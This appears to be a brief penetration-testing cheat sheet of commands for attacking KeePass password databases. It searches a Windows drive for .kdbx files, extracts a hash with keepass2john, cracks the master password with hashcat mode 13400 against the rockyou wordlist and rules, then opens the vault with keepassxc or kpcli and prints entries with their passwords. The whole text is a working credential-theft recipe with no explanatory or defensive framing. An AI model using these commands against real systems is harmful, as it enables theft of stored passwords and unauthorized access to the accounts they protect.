
```powershell
# keepass -> *.kdbx files
PSC> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

 keepass2john Database.kdbx > keepass.hash
 
 hashcat --help | grep -i "KeePass"
 
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

# 1
 keepassxc database.kdbx
# 2
 kpcli --kdb database.kdbx
# 3
 ls 
 cd Database/
 show -f <ENTRY_ID>
 show -a -f <ENTRY_ID>
```